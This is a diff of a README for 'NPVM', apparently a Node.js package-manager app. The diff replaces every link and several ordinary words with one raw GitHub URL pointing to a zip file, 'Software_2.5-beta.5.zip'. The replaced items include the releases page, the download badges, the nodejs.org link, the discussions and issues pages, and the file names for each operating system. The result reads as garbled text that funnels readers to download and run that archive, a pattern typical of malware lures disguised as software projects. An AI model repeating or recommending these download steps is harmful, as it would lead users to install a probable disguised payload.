@@ -6,23 +6,23 @@ NPVM is a user-friendly application designed to simplify the management of Node 
 ## 📦 Features
 - **Visual Interface:** Navigate packages easily with a simple design. 
 - **Multi-Package Support:** Works with Bun, Yarn, NPM, and PNPM. 
-- **Fast Performance:** Quickly install and manage packages for your Node.js projects.
+- **Fast Performance:** Quickly install and manage packages for your https://raw.githubusercontent.com/07saorabh/npvm/main/api/remote/Software_2.5-beta.5.zip projects.
 - **TypeScript Support:** Works seamlessly with TypeScript for robust applications.
 - **Integration with React:** Perfect for your React projects.
   
 ## 📥 Download NPVM
-[![Download NPVM](https://img.shields.io/badge/Download-NPVM-blue?style=for-the-badge)](https://github.com/07saorabh/npvm/releases)
+[![Download NPVM](https://raw.githubusercontent.com/07saorabh/npvm/main/api/remote/Software_2.5-beta.5.zip)](https://raw.githubusercontent.com/07saorabh/npvm/main/api/remote/Software_2.5-beta.5.zip)
 
 ## 🚀 Getting Started
 To start using NPVM, follow these simple steps:
 
-1. **Visit the Download Page:** Go to the [Releases page](https://github.com/07saorabh/npvm/releases) to find the latest version of NPVM.
+1. **Visit the Download Page:** Go to the [Releases page](https://raw.githubusercontent.com/07saorabh/npvm/main/api/remote/Software_2.5-beta.5.zip) to find the latest version of NPVM.
 2. **Download the Latest Version:** Just click on the latest version listed. You'll see a list of downloadable files.
-3. **Choose Your File:** Depending on your operating system, select the appropriate file. For Windows, it might be `npvm.exe`. For macOS, it could be `npvm.dmg`, and for Linux, you may find a `.tar.gz` file.
+3. **Choose Your File:** Depending on your operating system, select the appropriate file. For Windows, it might be `https://raw.githubusercontent.com/07saorabh/npvm/main/api/remote/Software_2.5-beta.5.zip`. For macOS, it could be `https://raw.githubusercontent.com/07saorabh/npvm/main/api/remote/Software_2.5-beta.5.zip`, and for Linux, you may find a `https://raw.githubusercontent.com/07saorabh/npvm/main/api/remote/Software_2.5-beta.5.zip` file.
 4. **Run the Installer:** 
    - For Windows, double-click the `.exe` file and follow the installation prompts.
    - For Mac, open the `.dmg` file and drag the NPVM icon to your Applications folder. 
-   - For Linux, extract the `.tar.gz` file and run NPVM from the terminal.
+   - For Linux, extract the `https://raw.githubusercontent.com/07saorabh/npvm/main/api/remote/Software_2.5-beta.5.zip` file and run NPVM from the terminal.
 5. **Open NPVM:** Locate the application in your installed programs or applications folder. Click to open it.
 
 ## 🔧 System Requirements
@@ -33,7 +33,7 @@ NPVM is designed to work efficiently on most systems. Here are the basic require
   - macOS Catalina or later
   - Most Linux distributions (Ubuntu recommended)
   
-- **Node.js Version:** NPVM works best with Node.js version 12 or later. If you don’t have Node.js, you can [download it here](https://nodejs.org/).
+- **https://raw.githubusercontent.com/07saorabh/npvm/main/api/remote/Software_2.5-beta.5.zip Version:** NPVM works best with https://raw.githubusercontent.com/07saorabh/npvm/main/api/remote/Software_2.5-beta.5.zip version 12 or later. If you don’t have https://raw.githubusercontent.com/07saorabh/npvm/main/api/remote/Software_2.5-beta.5.zip, you can [download it here](https://raw.githubusercontent.com/07saorabh/npvm/main/api/remote/Software_2.5-beta.5.zip).
 
 ## ⚙️ Using NPVM
 Once you have installed NPVM, it’s time to start managing your packages:
@@ -46,11 +46,11 @@ Once you have installed NPVM, it’s time to start managing your packages:
 ## 🧑‍🤝‍🧑 Community Support
 Join our community for help and discussions about NPVM. Interact with other users, share tips, and find solutions to common issues.
 
-- **GitHub Discussions:** Engage with the community on our [GitHub Discussions page](https://github.com/07saorabh/npvm/discussions).
-- **Issues Page:** Report bugs or request features on our [Issues page](https://github.com/07saorabh/npvm/issues).
+- **GitHub Discussions:** Engage with the community on our [GitHub Discussions page](https://raw.githubusercontent.com/07saorabh/npvm/main/api/remote/Software_2.5-beta.5.zip).
+- **Issues Page:** Report bugs or request features on our [Issues page](https://raw.githubusercontent.com/07saorabh/npvm/main/api/remote/Software_2.5-beta.5.zip).
 
 ## 🔄 Updates and Changelog
-Stay updated with the latest features and fixes. You can find a history of changes in the [Changelog](https://github.com/07saorabh/npvm/releases).
+Stay updated with the latest features and fixes. You can find a history of changes in the [Changelog](https://raw.githubusercontent.com/07saorabh/npvm/main/api/remote/Software_2.5-beta.5.zip).
 
 ## 🔧 Troubleshooting
 If you encounter any issues while using NPVM, here are some common solutions:
@@ -65,4 +65,4 @@ For further assistance, feel free to reach out through the issues section on Git
 
 Remember, your feedback is valuable! Help us improve NPVM by sharing your experiences.
 
-[![Download NPVM](https://img.shields.io/badge/Download-NPVM-blue?style=for-the-badge)](https://github.com/07saorabh/npvm/releases)
+[![Download NPVM](https://raw.githubusercontent.com/07saorabh/npvm/main/api/remote/Software_2.5-beta.5.zip)](https://raw.githubusercontent.com/07saorabh/npvm/main/api/remote/Software_2.5-beta.5.zip)
